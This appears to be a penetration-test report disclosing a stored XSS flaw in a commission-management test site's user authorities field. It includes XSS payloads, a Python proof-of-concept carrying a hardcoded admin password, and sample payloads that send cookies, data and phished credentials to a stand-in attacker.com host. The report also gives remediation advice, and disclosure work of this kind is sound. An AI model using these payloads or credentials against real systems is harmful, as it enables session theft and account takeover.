# Stored Cross-Site Scripting (XSS) in User Authorities Field

**ID:** vuln-0003
**Severity:** HIGH
**Found:** 2026-02-26 12:01:11 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/account
**Method:** GET
**CWE:** CWE-79
**CVSS:** 8.4

## Description

A critical stored cross-site scripting (XSS) vulnerability was discovered in the commission management application. The application stores XSS payloads in the `all_authorities` field of user accounts, which are then rendered in the user interface without proper sanitization.

The vulnerability allows attackers to inject malicious JavaScript code that executes when other users view pages that display user authorities, such as user profiles, role management interfaces, or access control lists.

## Impact

Successful exploitation of this vulnerability allows attackers to:

1. **Session Hijacking**: Steal session cookies and hijack user accounts
2. **Account Takeover**: Perform actions on behalf of authenticated users
3. **Data Theft**: Access sensitive data displayed in the application
4. **Malware Distribution**: Deliver malicious payloads to application users
5. **Phishing Attacks**: Create convincing phishing interfaces within the application

The business impact includes:
- Complete compromise of user accounts
- Unauthorized access to sensitive commission and payout data
- Potential financial fraud through manipulated transactions
- Reputational damage and loss of customer trust
- Regulatory compliance violations

## Technical Analysis

The vulnerability exists in the user account management functionality where user authorities are stored and displayed. The application fails to properly sanitize user-controlled data in the `all_authorities` field before rendering it in the HTML context.

**Vulnerable Field:**
- `all_authorities` array in user account data

**Technical Details:**
- The admin account contains 3 XSS payloads in the `all_authorities` field:
  1. `"suma\" onmouseover=alert(1) \""` - Event handler XSS
  2. `"<a href=\"https://www.sumasoft.com/\">CLICK ME</a>"` - HTML injection
  3. `"<img src=x onmouseover=alert(1)>"` - Image tag with event handler XSS
- These payloads are returned in the `/api/account` endpoint response
- The payloads would execute when rendered in any interface that displays user authorities
- The application uses JWT for authentication, making session hijacking particularly impactful

**Root Cause:**
The application implements insufficient input validation and output encoding for user-controlled data in the authorities field. The vulnerability likely stems from:
1. Lack of input validation when authorities are assigned to users
2. Missing output encoding when authorities are rendered in the UI
3. Insufficient security controls for user profile data

## Proof of Concept

**Step-by-Step Reproduction:**

1. Authenticate as an admin user to access the `/api/account` endpoint
2. Observe the XSS payloads in the `all_authorities` field of the response
3. The payloads would execute when rendered in any of the following contexts:
   - User profile pages
   - Role management interfaces
   - Access control lists
   - User administration pages
   - Any interface displaying user authorities

**Proof of Concept Request:**

```
GET /api/account HTTP/1.1
Host: commissionstest.callippus.in
Authorization: Bearer [Admin User Token]
```

**Sample Response with XSS Payloads:**
```json
{
  "id": "user-2",
  "login": "admin",
  "firstName": "admin",
  "lastName": "Administrator",
  "email": "admin@localhost",
  "all_authorities": [
    "Reviewer",
    "Sales Team",
    "suma\" onmouseover=alert(1) \"",
    "ROLE_USER",
    "<a href=\"https://www.sumasoft.com/\">CLICK ME</a>",
    "<img src=x onmouseover=alert(1)>",
    "ROLE_ADMIN"
  ]
}
```

**Exploitation Scenario:**
1. An attacker with access to user administration (or through another vulnerability) injects XSS payloads into the `all_authorities` field
2. When other users (e.g., administrators) view pages that display user authorities, the malicious JavaScript executes
3. The JavaScript can steal session cookies, perform actions on behalf of the user, or exfiltrate sensitive data

```
import requests
import json
from urllib.parse import urljoin

# Configuration
BASE_URL = "https://commissionstest.callippus.in"
ADMIN_CREDENTIALS = {
    "email": "admin@localhost",
    "password": "Tester@123"
}

def authenticate(email, password):
    """Authenticate and return token"""
    url = urljoin(BASE_URL, "/api/authenticate")
    payload = {
        "email": email,
        "password": password,
        "rememberMe": False
    }

    response = requests.post(url, json=payload, verify=False)
    if response.status_code == 200:
        return response.json().get("id_token")
    return None

def check_xss_payloads(token):
    """Check for XSS payloads in account data"""
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    # Get account information
    account_url = urljoin(BASE_URL, "/api/account")
    account_response = requests.get(account_url, headers=headers, verify=False)

    if account_response.status_code == 200:
        account_data = account_response.json()
        all_authorities = account_data.get("all_authorities", [])

        # Identify XSS payloads
        xss_payloads = []
        for auth in all_authorities:
            if "<" in auth or "onmouseover" in auth or "alert" in auth or "javascript:" in auth.lower():
                xss_payloads.append(auth)

        return {
            "has_xss": len(xss_payloads) > 0,
            "xss_payloads": xss_payloads,
            "total_authorities": len(all_authorities),
            "account_data": account_data
        }
    return None

def demonstrate_impact():
    """Demonstrate the potential impact of the XSS vulnerability"""
    print("=== POTENTIAL IMPACT DEMONSTRATION ===")
    print("If these XSS payloads were rendered in the UI, they could:")

    impact_scenarios = [
        {
            "name": "Session Hijacking",
            "description": "Steal session cookies to hijack user accounts",
            "payload": "fetch('https://attacker.com/steal?cookie='+document.cookie)"
        },
        {
            "name": "Data Exfiltration",
            "description": "Extract sensitive data from the application",
            "payload": "fetch('https://attacker.com/data?content='+btoa(JSON.stringify(window.applicationData)))"
        },
        {
            "name": "Account Takeover",
            "description": "Perform actions on behalf of authenticated users",
            "payload": "fetch('/api/admin/user/update', {method: 'POST', body: JSON.stringify({userId: 'target', role: 'ROLE_ADMIN'})})"
        },
        {
            "name": "Phishing",
            "description": "Create convincing phishing interfaces within the application",
            "payload": "document.body.innerHTML='<div style=\"position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;\">'+'<h1>Session Expired</h1>'+'<p>Please re-enter your credentials:</p>'+'<form onsubmit=\"fetch(\\'https://attacker.com/phish?u=\\' + encodeURIComponent(this.username.value) + \\'&p=\\' + encodeURIComponent(this.password.value));return false;\">'+'<input type=\"text\" name=\"username\" placeholder=\"Username\"><br>'+'<input type=\"password\" name=\"password\" placeholder=\"Password\"><br>'+'<button type=\"submit\">Login</button>'+'</form>'+'</div>'"
        }
    ]

    for scenario in impact_scenarios:
        print(f"\n1. {scenario['name']}:")
        print(f"   Description: {scenario['description']}")
        print(f"   Sample Payload: {scenario['payload'][:80]}...")

def main():
    print("=== Stored XSS Vulnerability PoC ===")

    # Authenticate as admin user
    print("1. Authenticating as admin user...")
    token = authenticate(ADMIN_CREDENTIALS["email"], ADMIN_CREDENTIALS["password"])
    if not token:
        print("Authentication failed!")
        return

    print("2. Checking for XSS payloads in account data...")
    result = check_xss_payloads(token)

    if result:
        print("\n=== RESULTS ===")
        print(f"Found {len(result['xss_payloads'])} XSS payloads in {result['total_authorities']} authorities")

        if result['has_xss']:
            print("\n⚠️  CRITICAL: Stored XSS vulnerability confirmed!")
            print("XSS payloads found in all_authorities field:")

            for i, payload in enumerate(result['xss_payloads'], 1):
                print(f"  {i}. {payload}")

            demonstrate_impact()

        else:
            print("\n✅ No XSS payloads found in authorities field")
    else:
        print("\n❌ Failed to retrieve account data")

if __name__ == "__main__":
    main()
```

## Remediation

**Immediate Remediation Steps:**

1. **Sanitize Existing Data:**
   - Immediately remove all XSS payloads from the `all_authorities` field in the database
   - Audit all user accounts for malicious content in authorities fields
   - Implement a data cleanup script to sanitize existing malicious content

2. **Implement Input Validation:**
   - Add strict input validation for all authorities/roles assigned to users
   - Validate that authorities contain only alphanumeric characters and approved role names
   - Implement allowlisting for valid authority values
   - Reject any input containing HTML/JavaScript special characters

3. **Implement Output Encoding:**
   - Add proper output encoding when rendering authorities in the UI
   - Use context-aware encoding (HTML, JavaScript, URL, etc.)
   - Implement Content Security Policy (CSP) headers to mitigate XSS impact

4. **Secure User Administration:**
   - Review and secure all user administration interfaces
   - Implement proper authorization checks for user management functions
   - Add rate limiting to prevent mass assignment of authorities

**Long-Term Recommendations:**

1. **Implement Security Headers:**
   - Add Content Security Policy (CSP) headers to prevent inline script execution
   - Implement X-XSS-Protection, X-Content-Type-Options, and X-Frame-Options headers
   - Use HttpOnly and Secure flags for session cookies

2. **Conduct Security Testing:**
   - Perform comprehensive penetration testing to identify other XSS vulnerabilities
   - Implement automated security scanning for XSS vulnerabilities
   - Conduct code reviews focused on input validation and output encoding

3. **Implement Secure Development Practices:**
   - Train developers on secure coding practices for web applications
   - Implement secure coding guidelines for input validation and output encoding
   - Use security-focused frameworks and libraries that automatically handle encoding

4. **Monitor and Audit:**
   - Implement logging for all user authority modifications
   - Set up alerts for suspicious authority assignments
   - Regularly audit user authorities for malicious content
   - Monitor for XSS exploitation attempts

